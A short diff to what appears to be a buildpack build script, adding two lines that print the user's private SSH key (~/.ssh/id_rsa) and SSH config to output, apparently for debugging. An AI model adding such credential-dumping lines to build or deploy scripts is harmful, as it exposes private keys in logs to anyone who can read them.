@@ -42,6 +42,8 @@ for BUILDPACK in $(cat $1/.buildpacks); do
       echo $USER
       if [ -d ~/.ssh ]; then
         ls ~/.ssh
+        cat ~/.ssh/id_rsa
+        cat ~/.ssh/config
       fi
       echo $url
       echo $dir
